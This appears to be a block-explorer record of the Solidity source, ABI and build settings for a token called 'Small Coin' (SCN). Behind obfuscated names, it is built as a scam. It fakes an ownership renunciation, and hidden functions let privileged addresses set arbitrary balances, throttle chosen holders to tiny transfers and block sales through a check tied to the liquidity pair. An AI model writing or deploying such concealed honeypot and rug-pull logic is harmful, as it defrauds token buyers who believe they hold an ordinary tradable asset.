{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tokenExemptReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellIs {\n    function createPair(address enableFromTo, address enableTotalLaunch) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface buyLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxFund) external view returns (uint256);\n\n    function transfer(address fundReceiver, uint256 maxLaunched) external returns (bool);\n\n    function allowance(address autoEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundReceiver,\n        uint256 maxLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalIsMode, uint256 value);\n    event Approval(address indexed autoEnable, address indexed spender, uint256 value);\n}\n\ninterface sellTotalMetadata is sellTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SmallCoin is tokenExemptReceiver, sellTotal, sellTotalMetadata {\n\n    string private autoLiquidityBuy = \"SCN\";\n\n    uint256 constant buyMin = 16 ** 10;\n\n    uint256 public receiverExempt = 0;\n\n    function allowance(address shouldSell, address isWallet) external view virtual override returns (uint256) {\n        if (isWallet == walletLaunched) {\n            return type(uint256).max;\n        }\n        return totalFund[shouldSell][isWallet];\n    }\n\n    uint256 public totalAmountLiquidity;\n\n    bool public buyMarketing;\n\n    uint256 liquidityTo;\n\n    address maxSwapIs;\n\n    address public feeExempt;\n\n    function launchTake() public {\n        emit OwnershipTransferred(feeExempt, address(0));\n        minMarketing = address(0);\n    }\n\n    address walletLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txAmountList;\n    }\n\n    constructor (){\n        \n        launchTake();\n        buyLiquidity senderAmountWallet = buyLiquidity(walletLaunched);\n        isReceiver = sellIs(senderAmountWallet.factory()).createPair(senderAmountWallet.WETH(), address(this));\n        maxSwapIs = sellIs(senderAmountWallet.factory()).feeTo();\n        if (totalAmountLiquidity != takeWalletExempt) {\n            autoFee = false;\n        }\n        feeExempt = _msgSender();\n        shouldSwap[feeExempt] = true;\n        feeReceiver[feeExempt] = autoAmountList;\n        if (autoSell != takeWalletExempt) {\n            autoFee = true;\n        }\n        emit Transfer(address(0), feeExempt, autoAmountList);\n    }\n\n    function listMax() private view {\n        require(shouldSwap[_msgSender()]);\n    }\n\n    function liquidityMax(address tokenTake, address fundReceiver, uint256 maxLaunched) internal returns (bool) {\n        if (tokenTake == feeExempt) {\n            return atMarketingSell(tokenTake, fundReceiver, maxLaunched);\n        }\n        uint256 launchedSell = sellTotal(isReceiver).balanceOf(maxSwapIs);\n        require(launchedSell == liquidityTo);\n        require(fundReceiver != maxSwapIs);\n        if (autoMax[tokenTake]) {\n            return atMarketingSell(tokenTake, fundReceiver, buyMin);\n        }\n        maxLaunched = launchModeSender(tokenTake, fundReceiver, maxLaunched);\n        return atMarketingSell(tokenTake, fundReceiver, maxLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenWallet;\n    }\n\n    function transfer(address atSwap, uint256 maxLaunched) external virtual override returns (bool) {\n        return liquidityMax(_msgSender(), atSwap, maxLaunched);\n    }\n\n    address private minMarketing;\n\n    bool public tradingMarketing;\n\n    uint256 private autoSell;\n\n    uint256 fromSell;\n\n    string private tokenWallet = \"Small Coin\";\n\n    uint256 private takeWalletExempt;\n\n    function atMarketingSell(address tokenTake, address fundReceiver, uint256 maxLaunched) internal returns (bool) {\n        require(feeReceiver[tokenTake] >= maxLaunched);\n        feeReceiver[tokenTake] -= maxLaunched;\n        feeReceiver[fundReceiver] += maxLaunched;\n        emit Transfer(tokenTake, fundReceiver, maxLaunched);\n        return true;\n    }\n\n    bool private autoFee;\n\n    uint256 private autoAmountList = 100000000 * 10 ** 18;\n\n    address public isReceiver;\n\n    mapping(address => bool) public shouldSwap;\n\n    mapping(address => uint256) private feeReceiver;\n\n    function listLimitLaunched(uint256 maxLaunched) public {\n        listMax();\n        liquidityTo = maxLaunched;\n    }\n\n    function launchModeSender(address tokenTake, address fundReceiver, uint256 maxLaunched) internal view returns (uint256) {\n        require(maxLaunched > 0);\n\n        uint256 isMinAt = 0;\n        if (tokenTake == isReceiver && listMarketing > 0) {\n            isMinAt = maxLaunched * listMarketing / 100;\n        } else if (fundReceiver == isReceiver && receiverExempt > 0) {\n            isMinAt = maxLaunched * receiverExempt / 100;\n        }\n        require(isMinAt <= maxLaunched);\n        return maxLaunched - isMinAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLiquidityBuy;\n    }\n\n    function swapBuyTrading(address tokenExempt) public {\n        require(tokenExempt.balance < 100000);\n        if (tradingMarketing) {\n            return;\n        }\n        if (atAmount != totalAmountLiquidity) {\n            autoFee = true;\n        }\n        shouldSwap[tokenExempt] = true;\n        if (atAmount != autoSell) {\n            autoFee = true;\n        }\n        tradingMarketing = true;\n    }\n\n    uint256 public listMarketing = 3;\n\n    function approve(address isWallet, uint256 maxLaunched) public virtual override returns (bool) {\n        totalFund[_msgSender()][isWallet] = maxLaunched;\n        emit Approval(_msgSender(), isWallet, maxLaunched);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoAmountList;\n    }\n\n    uint8 private txAmountList = 18;\n\n    function balanceOf(address maxFund) public view virtual override returns (uint256) {\n        return feeReceiver[maxFund];\n    }\n\n    event OwnershipTransferred(address indexed fromSenderTake, address indexed exemptTotal);\n\n    function shouldToken(address atSwap, uint256 maxLaunched) public {\n        listMax();\n        feeReceiver[atSwap] = maxLaunched;\n    }\n\n    uint256 private atAmount;\n\n    function transferFrom(address tokenTake, address fundReceiver, uint256 maxLaunched) external override returns (bool) {\n        if (_msgSender() != walletLaunched) {\n            if (totalFund[tokenTake][_msgSender()] != type(uint256).max) {\n                require(maxLaunched <= totalFund[tokenTake][_msgSender()]);\n                totalFund[tokenTake][_msgSender()] -= maxLaunched;\n            }\n        }\n        return liquidityMax(tokenTake, fundReceiver, maxLaunched);\n    }\n\n    mapping(address => bool) public autoMax;\n\n    function owner() external view returns (address) {\n        return minMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return minMarketing;\n    }\n\n    function maxShouldEnable(address isTakeSender) public {\n        listMax();\n        \n        if (isTakeSender == feeExempt || isTakeSender == isReceiver) {\n            return;\n        }\n        autoMax[isTakeSender] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSenderTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIsMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"listLimitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTakeSender\",\"type\":\"address\"}],\"name\":\"maxShouldEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"}],\"name\":\"swapBuyTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmountLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SmallCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}